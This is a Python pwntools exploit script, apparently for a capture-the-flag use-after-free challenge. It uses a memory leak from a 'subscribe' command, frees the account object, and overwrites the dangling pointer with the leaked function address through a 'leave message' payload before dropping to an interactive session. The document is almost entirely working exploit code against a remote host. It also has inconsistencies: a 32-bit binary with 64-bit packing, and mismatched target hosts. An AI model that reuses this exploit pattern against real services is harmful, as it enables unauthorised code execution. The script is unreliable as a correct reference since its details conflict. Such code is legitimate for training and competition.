# First, generate a template using:
#  pwn template --host mercury.picoctf.net --port 4593 ./vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

from enum import Enum
from pwn import *

class Commands(Enum):
    SUBSCRIBE       = "S"
    DELETE_ACCOUNT  = "I"
    CREATE_ACCOUNT  = "M"
    PAY             = "P"
    LEAVE_MESSAGE   = "L"
    EXIT            = "E"

def send_command(command):
    io.recvuntil("(e)xit\n")
    io.sendline(command.value)

def subscribe():
    log.info("Subscribing")
    memleak_line = "OOP! Memory leak..."

    send_command(Commands.SUBSCRIBE)
    line = io.recvlineS()
    if line == "Not logged in!":
        return None
    elif memleak_line in line:
        addr = int(line.replace(memleak_line, "").strip(), 16)
        log.info("Leaked address: {}".format(hex(addr)))
        io.recvline()
        return addr
    else:
        raise RuntimeError(f"Unexpected output during subscription: {line}")

def delete_account():
    log.info("Deleting account")

    send_command(Commands.DELETE_ACCOUNT)
    io.sendlineafter("You're leaving already(Y/N)?\n", "Y")
    io.recvline()

def leave_message(msg):
    log.info("Leaving message:\n{}".format(hexdump(msg)))
    send_command(Commands.LEAVE_MESSAGE)
    io.sendlineafter("try anyways:\n", msg)

def exit():
    log.info("Exiting")
    send_command(Commands.EXIT)

io = remote('uaf-shield.ctf.bsidestlv.com', 31337)

hahaexploitgobrrr_addr = subscribe()
delete_account()
payload = p64(hahaexploitgobrrr_addr) + p64(0)
leave_message(payload)
io.interactive()
log.success(io.recvline())
exit()